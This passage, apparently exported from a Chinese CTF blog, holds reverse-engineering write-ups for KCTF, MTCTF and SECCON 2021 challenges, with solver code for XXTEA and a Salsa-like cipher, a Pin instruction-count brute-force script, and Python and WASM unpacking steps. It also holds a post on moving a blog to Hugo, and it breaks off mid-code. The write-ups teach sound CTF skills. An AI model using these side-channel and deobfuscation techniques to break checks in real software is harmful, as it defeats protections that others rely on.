写的是用虚表找到验证函数，但我对虚表不太了解，做题的时候是用的动调下断点的方式做的\n动调的时候搜索字符串，发现能找到输入，然后在输入处下个硬件断点，能够断到 strlen，出来后还能看到 strncpy，但在这里断是不对的，因为没有点击检查，所以无论如何也进不了验证函数，于是朋友在获取消息的地方加了个消息断点，这时候再用硬件断点断下来，然后不断取消当前断点，在 strncpy 到的地方下新的断点，就能够进入到加密函数\n\r\n这个 base64 应该还是很容易看出来的，但动调拿结果能发现明显换表了，函数往里跟也不好跟，于是直接用动调拿结果\n这里构造了一个长度为 50 的输入，能够得到所有的 base64 字符\n输入：n++j'^aKgJ9*|an@@o$|8)9z#-;\u0026lt;\u0026lt;v789ghistu:/\u0026gt;^c?,/@YZ\n标准表下的输出：bisraideYUtnSjkqfGFuQEBvJHw4KTl6Iy07PDx2Nzg5Z2hpc3R1Oi8+XmM/LC9AWVo=\n这个输入就可以总结出这个题的 base 表了\nprvo9CHSJOcPIb6xRVUXQz0qBGDE72LNZduaefYT5K_8-4FAhlimjkngt1yMWs3w!\n接下来继续用动调找验证函数\n\r\n可以看到 v17 = xxx | 0x3300000000\n而最后的 call 是 MK_FP(WORD2(v17), v17)()\n结合着 32 位程序，猜测是一个天堂之门\n把调用的函数取出来，ida64 反编译一下\n\r\n这个函数大致猜测一下，显然是要求 v8 == v9[v28 - a1] 一直成立\n一开始的 do while 循环是对目标密文做了个解密，于是动调到验证的地方看一下内存\nGYldGg-iIoJlPX9hPXpjPqfdEY21B01TBTzeGqfKNR!!\n前面已经知道了 ! 就是这里 base64 的填充，于是这个字符串就是密文了\n换表 base64 的解密\n把表换回来之后的密文：\nZmxhZ3syMDIxLTEwLTA0LXlhbmd5YW5nYnVkZXlpfQ==\n明显的 flag 标志 Zmxh\n","date":"2021-12-23T22:23:17+08:00","image":"/post/two-challenges-in-kctf2021-fall/cover_hu426b1b4a5db42755d6b1974ac308773d_4005062_120x120_fill_q75_box_smart1.jpg","permalink":"/post/two-challenges-in-kctf2021-fall/","title":"Two Challenges in KCTF2021 Fall"},{"content":"修改主题的想法 之前的 Next 用了有一年多了，自己也做了各种修改，比如加个背景、改个字体之类的。但最近发现由于我硬改了一些颜色，导致深色模式下没什么问题，但浅色模式下就有一个模块是黑色的，很难看，又懒得找当时自己写的代码在哪儿了。\n另一个原因是队友们都跟风用 Next 主题，难免有点审美疲劳。最终就决定给自己换个主题。\n本来的选择 其实最一开始并没有打算换成 Hugo，毕竟 Hexo 又不是不能用，既然很多东西都配置好了，那换个主题直接生成多好。于是我精挑细选选了个一个 Hexo 主题：https://github.com/Haojen/hexo-theme-Claudia。\n然而配置的时候发现好像因为 npm 的原因，scss 文件一直跑不起来，很多 css 文件无法生成，于是就想干脆迁移到 Hugo，这样还省得配 npm 了。\n结识 Hugo stack 最初看到 Hugo 其实是在帮 web 手收集博客的时候看到了陆队的博客，正好记录了迁移到 Hugo 的过程。博客里讲了 Hugo 的静态网页生成速度很快。联想到自己的博客垃圾文章也越来越多，Hexo 确实有点慢了，Hugo 也许以后会是个不错的选择。\n后来想要帮校队搭个博客，于是决定试试 Hugo。最一开始看中的是 Hugo Bootstrap Theme，想把背景改一下颜色，但是失败了，于是又找了找主题，发现 Stack 更好看，于是干脆就拿 Stack 搭了，而后来才发现，原来陆队的博客也是 stack 主题，看来审美从来没有变过 😂。\n于是，在 Claudia 配置失败后，我果断转到了 Hugo Stack 主题。\n目前的修改——友链 Stack 主题本身是不带友链的，作者应该是正在写，但比较忙，也不知道什么时候能写完，于是就看了看别人的方案。直接搜能搜到一个方案，但讲得不是特别清楚，搭建失败了。后来在 pull request 里面发现有人实现了一个，作者没有采纳而已，于是就以这个作为临时方案了。\n主题 assets/scss/style.scss 27行添加：\n@import \u0026#34;partials/layout/links.scss\u0026#34;; 新建 assets/scss/partials/layout/links.scss\n/* Place your custom SCSS in HUGO_SITE_FOLDER/assets/scss/custom.scss */ // 头像边框颜色 $avatar-border-color: #566a82; $avatar-border-color-dark: #C0C0C0; // style-card 背景色 $friend-link-background-color: #51a8ca10; $friend-link-background-color-dark: #69697141; // 友链 name 原始色 $friend-link-color: #11a1a2; $friend-link-color-dark: #ffffff; // 友链 name 气泡响应对比色 $friend-link-hover-color: #ea4e2f; $friend-link-hover-color-dark:\trgb(241, 213, 159); // bio 简介上下文 $context-color: #404040; $context-color-dark:\t#c0c0c0; // 友链头像及头像边框的样式 .friend-avatar { width: 56px; height: 56px; padding: 2px; margin-top: 14px; margin-left: 14px; border-radius: 15px; border: 3.6px inset $avatar-border-color; [data-scheme=dark] \u0026amp; { border: 3.6px inset $avatar-border-color-dark; } } .friend-link-div { // 实现卡片双栏排列效果  height: auto; margin-top: auto; margin-inline-start: 4.5%; width: 43%; display: inline-block !important; // 控制上下连续排列的卡片之间的行距  margin-bottom: 11px; // 卡片圆角  border-radius: 7px 7px 7px 7px; // 卡片阴影  -webkit-box-shadow: 0px 14px 32px 0px rgba(231, 224, 224, 0.15); -moz-box-shadow: 0px 14px 32px 0px rgba(0, 0, 0, 0.15); box-shadow: 0.7px 1px 6px 0px rgba(0, 0, 0, 0.16); // 卡片背景色  background: $friend-link-background-color; [data-scheme=dark] \u0026amp; { background: $friend-link-background-color-dark; } // 卡牌气泡响应动画  -webkit-transition: transform 0.4s ease; -moz-transition: transform 0.4s ease; -o-transition: transform 0.4s ease; transition: transform 0.15s ease; \u0026amp;:hover { transform: scale(1.03); } } .friend-link-avatar { width: 92px; float: left; margin-right: 2px; } // name 特效样式， hover 气泡效果,友链 name 变色 .friend-link-info { margin-top: 13px; margin-right: 18px; color: $friend-link-color; [data-scheme=dark] \u0026amp; { color: $friend-link-color-dark; } \u0026amp;:hover { color: $friend-link-hover-color; [data-scheme=dark] \u0026amp; { color: $friend-link-hover-color-dark; } } } // name 文字样式 .friend-name { text-overflow: ellipsis; overflow: hidden; white-space: nowrap; font-style: normal; font-family: \u0026#39;Comic Sans MS\u0026#39;,cursive; font-size: 16px; } // bio 文字样式 .friend-bio { text-overflow: ellipsis; overflow: hidden; white-space: nowrap; margin-top: auto; // font: 12px/1 Tahoma,Helvetica,Arial,\u0026#34;\\5b8b\\4f53\u0026#34;,sans-serif;  font-family: Helvetica, \u0026#39;Hiragino Sans GB\u0026#39;, \u0026#39;Microsoft Yahei\u0026#39;, \u0026#39;微软雅黑\u0026#39;, Arial, sans-serif; font-size: 14px; color: $context-color; [data-scheme=dark] \u0026amp; { color: $context-color-dark; } } // 响应式页面，允许根据不同的尺寸调整样式 @media screen and (max-width: 600px) { .friend-bio { display: none; } .friend-link-avatar { width: 84px; margin: auto; } .friend-link-info { height: 100%; margin: auto; display: flex; align-items: center; justify-content: center; } .friend-name { font-size: 14px; } } 接下来只需要在自己的 page 页面下加个 links.md 即可\n---\rtitle: \u0026quot;Links 友情链接\u0026quot;\rdate: 2021-10-01T16:45:06+08:00\rslug: \u0026quot;links\u0026quot;\rlayout: \u0026quot;links\u0026quot;\rlicense: false\rtoc: false\rmenu:\rmain:\rweight: -80\rpre: link\r---\r## Friends\r{ {\u0026lt; friend name=\u0026quot;\u0026quot; url=\u0026quot;\u0026quot; avatar=\u0026quot;\u0026quot; bio=\u0026quot;\u0026quot; \u0026gt;} }\r两个大括号之间的空格需要去掉，我这里不去掉的话会显示友链标签（竟然没有考虑到代码块的问题，可以考虑提 issue 了）\r目前的问题 在迁移博客的时候顺便稍微整合了一下以前的一些文章，但同时也发现了问题，之前用 Hexo 的时候，习惯用 \u0026lt;--!more--\u0026gt; 来写摘要，所以就使得摘要习惯性地放了目录，目前还没能在 Hugo 中找到对应的解决方案，所以可能以后的博客归纳思路需要改一改，但之前的应该就这样了。\n","date":"2021-12-21T23:23:50+08:00","image":"/post/migrate-to-hugo/hugo-stack-logo_hu68d4500f44eeff3c046abd6af3014f70_562499_120x120_fill_q75_box_smart1.jpg","permalink":"/post/migrate-to-hugo/","title":"Migrate to Hugo"},{"content":" 打美团 CTF 的时候才意识到，有一种坐牢叫AK\n [MTCTF 4th]wow 先进行脱壳，因为脱壳后用的是绝对地址，而加载的时候是动态加载，所有没有办法调试，那就直接静态看吧\nJUMPOUT 那里看一下汇编，发现有一个天堂之门\npush 0x33 call $+5 add [esp+84h+var_84], 5 retf 直接把后面的数据全 dump 出来，然后用 ida64 打开\nvoid __fastcall sub_0(unsigned int *a1) { unsigned int v1; // er9  int v2; // ebp  unsigned int v3; // esi  unsigned int *v4; // rdi  unsigned int *v5; // r10  unsigned int v6; // ebx  unsigned int i; // er11  unsigned int v8; // er8  int v9; // edx  unsigned int v10; // eax  unsigned int v11; // er9  unsigned int v12; // er8  int v13; // ebx  int v14; // ebx  int v15; // ebx  int v16; // edx  unsigned int v17; // eax  unsigned int v18; // er9  v1 = a1[8]; v2 = 12; v3 = 0; while ( 1 ) { v3 += 1732584193; v4 = a1 + 1; v5 = a1; v6 = v3 \u0026gt;\u0026gt; 2; for ( i = 0; i \u0026lt; 8; ++i ) { v8 = *v4; if ( (((unsigned __int8)i ^ (unsigned __int8)v6) \u0026amp; 3) != 0 ) { switch ( ((unsigned __int8)i ^ (unsigned __int8)v6) \u0026amp; 3 ) { case 1: v9 = (v1 \u0026gt;\u0026gt; 5) ^ (4 * v8); v10 = v1; v11 = v1 ^ 0x10325476; break; case 2: v9 = (v1 \u0026gt;\u0026gt; 5) ^ (4 * v8); v10 = v1; v11 = v1 ^ 0x98BADCFE; break; case 3: v9 = (v1 \u0026gt;\u0026gt; 5) ^ (4 * v8); v10 = v1; v11 = v1 ^ 0xC3D2E1F0; break; default: goto LABEL_12; } } else { v9 = (v1 \u0026gt;\u0026gt; 5) ^ (4 * v8); v10 = v1; v11 = v1 ^ 0xEFCDAB89; } *v5 += (v11 + (v3 ^ v8)) ^ (((16 * v10) ^ (v8 \u0026gt;\u0026gt; 3)) + v9); v1 = *v5; LABEL_12: ++v4; ++v5; } v12 = *a1; v13 = ((unsigned __int8)i ^ (unsigned __int8)v6) \u0026amp; 3; if ( !v13 ) { v16 = (v1 \u0026gt;\u0026gt; 5) ^ (4 * v12); v17 = v1; v18 = v1 ^ 0xEFCDAB89; goto LABEL_21; } v14 = v13 - 1; if ( !v14 ) { v16 = (v1 \u0026gt;\u0026gt; 5) ^ (4 * v12); v17 = v1; v18 = v1 ^ 0x10325476; goto LABEL_21; } v15 = v14 - 1; if ( !v15 ) { v16 = (v1 \u0026gt;\u0026gt; 5) ^ (4 * v12); v17 = v1; v18 = v1 ^ 0x98BADCFE; LABEL_21: a1[8] += (v18 + (v3 ^ v12)) ^ (((16 * v17) ^ (v12 \u0026gt;\u0026gt; 3)) + v16); v1 = a1[8]; goto LABEL_22; } if ( v15 == 1 ) { v16 = (v1 \u0026gt;\u0026gt; 5) ^ (4 * v12); v17 = v1; v18 = v1 ^ 0xC3D2E1F0; goto LABEL_21; } LABEL_22: if ( !--v2 ) __asm { retfq } } } 是一个 xxtea，用 switch 来判断使用哪个 key，round 是 12，所以直接用脚本解密就行\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #define DELTA 0x67452301 #define MX (((z\u0026gt;\u0026gt;5^y\u0026lt;\u0026lt;2) + (y\u0026gt;\u0026gt;3^z\u0026lt;\u0026lt;4)) ^ ((sum^y) + (key[(p\u0026amp;3)^e] ^ z)))  void btea(uint32_t *v, int n, uint32_t const key[4]) { uint32_t y, z, sum; unsigned p, rounds, e; if (n \u0026gt; 1) /* Coding Part */ { printf(\u0026#34;No use\u0026#34;); } else if (n \u0026lt; -1) /* Decoding Part */ { n = -n; // rounds = 6 + 52/n;  rounds = 12; sum = rounds*DELTA; y = v[0]; do { e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; for (p=n-1; p\u0026gt;0; p--) { z = v[p-1]; y = v[p] -= MX; } z = v[n-1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); } } int main() { unsigned int v[10] = { 3640088821u, 1382566363u, 3805750627u, 1214181292u, 1620003782u, 1482291050u, 2956289443u, 1044419009u, 3554368410u, 0u }; uint32_t const k[4]= {0xEFCDAB89u, 0x10325476u, 0x98BADCFEu, 0xC3D2E1F0u}; int n= -9; //n的绝对值表示v的长度，取正表示加密，取负表示解密  // v为要加密的数据是两个32位无符号整数  // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  btea(v, n, k); printf(\u0026#34;%s\\n\u0026#34;, v); return 0; } [MTCTF 4th]Superflat 这个题用了 movfuscator，正好前段时间有人在群里提过，一下就想起来了\n但要解混淆需要装一个 demov 的工具，配置环境有点复杂\n考虑到这个程序中没有任何的动态链接过程，而且能看到两个函数名 getchar 和 putchar，那大胆猜测是按照每一位来判断的，可以考虑上 pintools\n先手动测试了一下，发现对于同样的输入，执行的指令数字完全相同，并且每正确一位会增加 4888 条指令，于是根据 pintools 这个工具自己写个爆破脚本\n在爆破前看了一下 output 文件，发现总长度是42位，于是直接猜测 flag 格式为 flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx} 其中 x 为 [0-9a-f] （小写字母是手动爆破了第一位确定的）\nimport subprocess password = \u0026#34;flag{d06f0bcc-xxxxxxxxxxxxxxxxxxxxxxxxxxx}\u0026#34; cur_pos = 14 last_count = 693225 while cur_pos \u0026lt; len(password) - 1: for i in \u0026#34;0123456789abcdef-\u0026#34;: command = \u0026#34;echo \u0026#34; + password[:cur_pos] + i + password[cur_pos+1:] + \u0026#34; | ./pin-3.18-98332-gaebd7b1e6-gcc-linux/pin -t ./pin-3.18-98332-gaebd7b1e6-gcc-linux/source/tools/ManualExamples/obj-ia32/inscount0.so -- ./superflat; cat inscount.out\u0026#34; output = subprocess.check_output(command, shell=True, stderr=subprocess.PIPE) count = int(output.split(b\u0026#39;\\n\u0026#39;)[1].split()[1].decode()) if count - last_count \u0026gt; 0: print (i) password = password[:cur_pos] + i + password[cur_pos + 1:] cur_pos += 1 last_count = count break else: print (\u0026#34;\\nerror:\u0026#34;, cur_pos) break # flag{d06f0bcc-93e0-9c5b-161e-e1464176d395} 第一次在比赛中用上 pintool，纪念一下\n[SECCONCTF 2021]dis-me python 逆向，一上线就被叫来做这题了（属于是把 python 题目包场了）\n先自己看了眼字节码，然后判断了一下，删了一些东西，再 pycdc 反编译，同时结合着自己的分析，拿到了反编译结果\nimport marshal import base64 import types f = open(__file__, \u0026#39;rb\u0026#39;) f.seek(12) s = marshal.loads(f.read()).co_code[4:] types.FunctionType(marshal.loads(base64.b64decode(bytes([((y - x * 7 - 45) % 256) for x, y in enumerate((s[2 : 2 + s[0] * 256 + s[1]]))]))), globals())() del s del f del marshal del base64 del types return None 读取了自身文件，然后偏移改到了 12，就是跳过了文件头，直接从 E3 00 00 00 开始，是 marshal 的正确格式（但自己写的时候有一些问题，不太懂了）\n接下来 .co_code[4:] 猜测是取了代码段，并从下标为 4 的地方开始取\ns[2 : 2 + s[0] * 256 + s[1]]：接下来根据取出数据的前两位来判断接下来取出数据的总长度，并且跳过了前两位\n于是最终取出的数据为 0x2C 开始的数据，一直取到 64 00 64 01 这个正确程序的开头部分\ntypes 那一行里面的 bytes([((y - x * 7 - 45) % 256) for x, y in enumerate((s[2 : 2 + s[0] * 256 + s[1]]))]) 一开始并没有分析出来，主要是位置不确定，于是自己拿数据试了试可能的几个方案，发现这样可以得到 base64的结果，就说明是这个了\n将 base64 的结果解码到文件，然后补全文件头后 uncompyle6 反编译，得到正确的流程\nf = lambda n: n if n \u0026lt;= 1 else (f(n - 1) + f(n - 2)) % 10 flag = input(\u0026#39;Input the flag \u0026gt; \u0026#39;) s = 1 if flag.startswith(\u0026#39;SECCON{\u0026#39;): if flag.endswith(\u0026#39;}\u0026#39;): if len(flag) == 40: s = sum(abs(ord(c) - ord(str(f(i)))) for i, c in enumerate(flag[7:-1])) s or print(\u0026#39;Correct! The flag is\u0026#39;, flag) else: print(\u0026#39;Wrong :(\u0026#39;) 直接把 str(f(i)) 跑一遍就拿到 flag 了（斐波那契）\n[SECCONCTF 2021]flag 这道题是个 wasm 逆向，人生第一次做出来，值得纪念\n先从网站上把 wasm 文件下载下来\n第一步肯定是 wasm2c 一下\n./wasm2c 0001d242.wasm -o out.c 接下来进行编译\ng++ -c out.c -o out.o 用 ida 打开，发现一个叫 check 的函数，到网站的 js 里面动调到 check，可以获取加载的数据\ncheck(input, \u0026#34;NekoPunch\u0026#34;, \u0026#34;6dbf84f73cf6a112268b09525ea550a665e21cb2e3e13af7e3ea0ecb52f5b9cda5b6522b1e978734553f1d7956d4af94bfc3f4d68c8fba9eeecf4035550b9106f70d57d1a6cdaf3211eaaa78d71a9038b71be621241e8b608a43b107f8860f543ab0189aa063800de4bae7d0b11045b8\u0026#34;) 于是看一下 check 函数就行\nv6 = w2c_g0; i32_store(\u0026amp;w2c_memory, (unsigned int)w2c_g0 + 40LL, a1); // 省略  v7 = i32_load(\u0026amp;w2c_memory, v6 + 40LL); v8 = i32_load(\u0026amp;w2c_memory, v6 + 40LL); v9 = w2c_f25(v8) - 1; v52 = w2c_f21(v7, v9); if ( (char)i32_load8_u(\u0026amp;w2c_memory, v52) == \u0026#39;}\u0026#39; wasm 是基于堆栈的，这里明显能看到栈的痕迹，上来先把第一个参数（输入字符串的地址）存到了 v6+40 的地方（猜测v6是栈顶）\n通过第一条 if 比较，猜测 v52 是输入的最后一位，这样就可以知道 w2c_f25 是计算长度，w2c_f21 相当于 a1[a2]\n接下来注意到中间有一个非常整齐的循环\nwhile ( (int)i32_load(\u0026amp;w2c_memory, v6 + 12LL) \u0026lt; 128 ) { v22 = i32_load(\u0026amp;w2c_memory, v6 + 28LL); w2c_f23(v22, 0, 4u, 8u, 0xCu); v23 = i32_load(\u0026amp;w2c_memory, v6 + 28LL); w2c_f23(v23, 5u, 9u, 0xDu, 1u); v24 = i32_load(\u0026amp;w2c_memory, v6 + 28LL); w2c_f23(v24, 0xAu, 0xEu, 2u, 6u); v25 = i32_load(\u0026amp;w2c_memory, v6 + 28LL); w2c_f23(v25, 0xFu, 3u, 7u, 0xBu); v26 = i32_load(\u0026amp;w2c_memory, v6 + 28LL); w2c_f23(v26, 0, 1u, 2u, 3u); v27 = i32_load(\u0026amp;w2c_memory, v6 + 28LL); w2c_f23(v27, 5u, 6u, 7u, 4u); v28 = i32_load(\u0026amp;w2c_memory, v6 + 28LL); w2c_f23(v28, 0xAu, 0xBu, 8u, 9u); v29 = i32_load(\u0026amp;w2c_memory, v6 + 28LL); w2c_f23(v29, 0xFu, 0xCu, 0xDu, 0xEu); v57 = i32_load(\u0026amp;w2c_memory, v6 + 12LL) + 1; i32_store(\u0026amp;w2c_memory, v6 + 12LL, v57); } 显然 v6+12 的地方存的是循环次数，这个格式和前段时间学的 salsa20 很像\n查看 w2c_f23 函数\ni32_store(\u0026amp;w2c_memory, (unsigned int)(w2c_g0 - 32) + 28LL, a1); i32_store(\u0026amp;w2c_memory, v9 + 24LL, a2); i32_store(\u0026amp;w2c_memory, v9 + 20LL, a3); i32_store(\u0026amp;w2c_memory, v9 + 16LL, a4); i32_store(\u0026amp;w2c_memory, v9 + 12LL, a5); v10 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v11 = i32_load(\u0026amp;w2c_memory, v9 + 24LL) + v10; v12 = i32_load8_u(\u0026amp;w2c_memory, v11); v13 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v14 = i32_load(\u0026amp;w2c_memory, v9 + 12LL) + v13; v15 = i32_load8_u(\u0026amp;w2c_memory, v14); v16 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v17 = i32_load(\u0026amp;w2c_memory, v9 + 24LL) + v16; v18 = i32_load8_u(\u0026amp;w2c_memory, v17); v19 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v20 = i32_load(\u0026amp;w2c_memory, v9 + 12LL) + v19; v21 = i32_load8_u(\u0026amp;w2c_memory, v20); v22 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v23 = i32_load(\u0026amp;w2c_memory, v9 + 20LL) + v22; v24 = (((int)(unsigned __int8)(v21 + v18) \u0026gt;\u0026gt; 7) | (2 * (unsigned __int8)(v15 + v12))) ^ (unsigned __int8)i32_load8_u(\u0026amp;w2c_memory, v23); i32_store8(\u0026amp;w2c_memory, v23, v24); // x[b] ^= ROL((x[d] + x[a]), 1)  v25 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v26 = i32_load(\u0026amp;w2c_memory, v9 + 20LL) + v25; v27 = i32_load8_u(\u0026amp;w2c_memory, v26); v28 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v29 = i32_load(\u0026amp;w2c_memory, v9 + 24LL) + v28; v30 = i32_load8_u(\u0026amp;w2c_memory, v29); v31 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v32 = i32_load(\u0026amp;w2c_memory, v9 + 20LL) + v31; v33 = i32_load8_u(\u0026amp;w2c_memory, v32); v34 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v35 = i32_load(\u0026amp;w2c_memory, v9 + 24LL) + v34; v36 = i32_load8_u(\u0026amp;w2c_memory, v35); v37 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v38 = i32_load(\u0026amp;w2c_memory, v9 + 16LL) + v37; v39 = (((int)(unsigned __int8)(v36 + v33) \u0026gt;\u0026gt; 6) | (4 * (unsigned __int8)(v30 + v27))) ^ (unsigned __int8)i32_load8_u(\u0026amp;w2c_memory, v38); i32_store8(\u0026amp;w2c_memory, v38, v39); // x[c] ^= ROL((x[a] + x[b]), 2)  v40 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v41 = i32_load(\u0026amp;w2c_memory, v9 + 16LL) + v40; v42 = i32_load8_u(\u0026amp;w2c_memory, v41); v43 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v44 = i32_load(\u0026amp;w2c_memory, v9 + 20LL) + v43; v45 = i32_load8_u(\u0026amp;w2c_memory, v44); v46 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v47 = i32_load(\u0026amp;w2c_memory, v9 + 16LL) + v46; v48 = i32_load8_u(\u0026amp;w2c_memory, v47); v49 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v50 = i32_load(\u0026amp;w2c_memory, v9 + 20LL) + v49; v51 = i32_load8_u(\u0026amp;w2c_memory, v50); v52 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v53 = i32_load(\u0026amp;w2c_memory, v9 + 12LL) + v52; v54 = (((int)(unsigned __int8)(v51 + v48) \u0026gt;\u0026gt; 5) | (8 * (unsigned __int8)(v45 + v42))) ^ (unsigned __int8)i32_load8_u(\u0026amp;w2c_memory, v53); i32_store8(\u0026amp;w2c_memory, v53, v54); // x[d] ^= ROL((x[b] + x[c]), 3)  v55 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v56 = i32_load(\u0026amp;w2c_memory, v9 + 12LL) + v55; v57 = i32_load8_u(\u0026amp;w2c_memory, v56); v58 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v59 = i32_load(\u0026amp;w2c_memory, v9 + 16LL) + v58; v60 = i32_load8_u(\u0026amp;w2c_memory, v59); v61 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v62 = i32_load(\u0026amp;w2c_memory, v9 + 12LL) + v61; v63 = i32_load8_u(\u0026amp;w2c_memory, v62); v64 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v65 = i32_load(\u0026amp;w2c_memory, v9 + 16LL) + v64; v66 = i32_load8_u(\u0026amp;w2c_memory, v65); v67 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v68 = i32_load(\u0026amp;w2c_memory, v9 + 24LL) + v67; v69 = (((int)(unsigned __int8)(v66 + v63) \u0026gt;\u0026gt; 4) | (16 * (unsigned __int8)(v60 + v57))) ^ (unsigned __int8)i32_load8_u(\u0026amp;w2c_memory, v68); i32_store8(\u0026amp;w2c_memory, v68, v69); // x[a] ^= ROL((x[c] + x[d]), 4) 这个东西套到 salsa20 的模板里就长这个样子\n#define QUARTERROUND(x, a, b, c, d) \\ x[b] ^= ROL(x[a] + x[d], 1); \\ x[c] ^= ROL(x[b] + x[a], 2); \\ x[d] ^= ROL(x[c] + x[b], 3); \\ x[a] ^= ROL(x[d] + x[c], 4); 于是那个 while 循环就是这个\nfor(int i = 0; i \u0026lt; 128; i++){ QUARTERROUND(v6+28LL, 0, 4, 8, 12); QUARTERROUND(v6+28LL, 5, 9, 13, 1); QUARTERROUND(v6+28LL, 10, 14, 2, 6); QUARTERROUND(v6+28LL, 15, 3, 7, 11); QUARTERROUND(v6+28LL, 0, 1, 2, 3); QUARTERROUND(v6+28LL, 5, 6, 7, 4); QUARTERROUND(v6+28LL, 10, 11, 8, 9); QUARTERROUND(v6+28LL, 15, 12, 13, 14); } 接下来看一下验证部分\ni32_store(\u0026amp;w2c_memory, v6 + 8LL, 0LL); while ( (int)i32_load(\u0026amp;w2c_memory, v6 + 8LL) \u0026lt; 16 ) { v30 = i32_load(\u0026amp;w2c_memory, v6 + 32LL); v31 = 4 * i32_load(\u0026amp;w2c_memory, v6 + 20LL); v32 = 2 * i32_load(\u0026amp;w2c_memory, v6 + 8LL) + v31; v33 = w2c_f21(v30, v32); v34 = i32_load8_u(\u0026amp;w2c_memory, v33); v35 = i32_load(\u0026amp;w2c_memory, v6 + 28LL); v36 = i32_load(\u0026amp;w2c_memory, v6 + 8LL) + v35; v55 = (unsigned __int8)i32_load8_u(\u0026amp;w2c_memory, v36); v37 = i32_load8_u(\u0026amp;w2c_memory, v55 / 16 + 3504LL); v38 = (v34 != v37) | (unsigned int)i32_load(\u0026amp;w2c_memory, v6 + 24LL); i32_store(\u0026amp;w2c_memory, v6 + 24LL, v38); v39 = i32_load(\u0026amp;w2c_memory, v6 + 32LL); v40 = 4 * i32_load(\u0026amp;w2c_memory, v6 + 20LL); v41 = 2 * i32_load(\u0026amp;w2c_memory, v6 + 8LL) + v40; v42 = w2c_f21(v39, v41 + 1); v43 = i32_load8_u(\u0026amp;w2c_memory, v42); v44 = i32_load(\u0026amp;w2c_memory, v6 + 28LL); v45 = i32_load(\u0026amp;w2c_memory, v6 + 8LL) + v44; v3 = (unsigned __int8)i32_load8_u(\u0026amp;w2c_memory, v45) % 16; v46 = i32_load8_u(\u0026amp;w2c_memory, v3 + 3504LL); v47 = (v43 != v46) | (unsigned int)i32_load(\u0026amp;w2c_memory, v6 + 24LL); i32_store(\u0026amp;w2c_memory, v6 + 24LL, v47); v58 = i32_load(\u0026amp;w2c_memory, v6 + 8LL) + 1; i32_store(\u0026amp;w2c_memory, v6 + 8LL, v58); } v59 = i32_load(\u0026amp;w2c_memory, v6 + 20LL) + 8; i32_store(\u0026amp;w2c_memory, v6 + 20LL, v59); } v48 = i32_load(\u0026amp;w2c_memory, v6 + 28LL); w2c_free(v48); v60 = i32_load(\u0026amp;w2c_memory, v6 + 24LL); i32_store(\u0026amp;w2c_memory, v6 + 44LL, v60); } else { LABEL_8: i32_store(\u0026amp;w2c_memory, v6 + 44LL, 0xFFFFFFFFLL); } v49 = i32_load(\u0026amp;w2c_memory, v6 + 44LL); w2c_g0 = v6 + 48; --wasm_rt_call_stack_depth; return v49; } 很显然 v6+44 和 v6+24 就是判断是否通过验证的，只要每次 (v43 != v46) 和 (v34 != v37) 不成立就行\n根据之前的经验，v6+32 是第三个参数（密文字符串地址），v6+20 是最外层循环的索引（每次 +8），v6+8 是这层循环的次数，v6+28 是上一个循环加密后的结果\n于是把这个循环简化一下\nfor (int i = 0; i \u0026lt; len(input); i++){ // ...  for (int j = 0; j \u0026lt; 16; j++) { v30 = a3; v31 = 4 * i; v32 = 2 * j + v31; v33 = \u0026amp;v30[v32]; v34 = *v33; v35 = cipher; v36 = \u0026amp;cipher[i]; v55 = *v36; v37 = loc_3504[v55 / 16]; // 3504 中存的是 0-9a-f  res |= (v34 != v37); // 后半部分相似  } } 再简化一下就是\nfor (int i = 0; i \u0026lt; strlen(input); i++) { // ...  for (int j = 0; j \u0026lt; 16; j++) { v34 = a3[4 * i + 2 * j]; v37 = loc_3504[cipher[i] / 16]; v43 = a3[4 * i + 2 * j + 1]; v46 = loc_3504[cipher[i] % 16]; res |= (v34 != v37) | (v43 != v46); } } 所以只需要让加密结果转 hex 后等于密文即可\n同样的方法，翻译一下第一个 while 循环\nfor (int j = 0; j \u0026lt; 8; j++) { cipher[8 + j] = input[i + j]; } 于是想要找一下前八位是什么，发现\nv12 = i32_load(\u0026amp;w2c_memory, v6 + 36LL); v13 = w2c_f20(v12); i32_store(\u0026amp;w2c_memory, v6 + 28LL, v13); 于是猜是把第二个参数的前 8 字节存到了 cipher 的前 8 字节\n这样就分析完了整个加密流程，每次取 8 字节明文，使用类似 salsa 加密的核心算法，生成的结果与 hexstring 进行比较\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdint.h\u0026gt; #define ROL(a,b) (((a) \u0026lt;\u0026lt; (b)) | ((a) \u0026gt;\u0026gt; (8 - (b)))) #define REQUARTERROUND(x, a, b, c, d) \\ x[a] ^= ROL((x[d] + x[c]) \u0026amp; 0xff, 4); \\ x[d] ^= ROL((x[c] + x[b]) \u0026amp; 0xff, 3); \\ x[c] ^= ROL((x[b] + x[a]) \u0026amp; 0xff, 2); \\ x[b] ^= ROL((x[a] + x[d]) \u0026amp; 0xff, 1);  using namespace std; void decrypt(unsigned char * in){ for(int i = 0; i \u0026lt; 128; i++){ REQUARTERROUND(in, 15, 12, 13, 14); REQUARTERROUND(in, 10, 11, 8, 9); REQUARTERROUND(in, 5, 6, 7, 4); REQUARTERROUND(in, 0, 1, 2, 3); REQUARTERROUND(in, 15, 3, 7, 11); REQUARTERROUND(in, 10, 14, 2, 6); REQUARTERROUND(in, 5, 9, 13, 1); 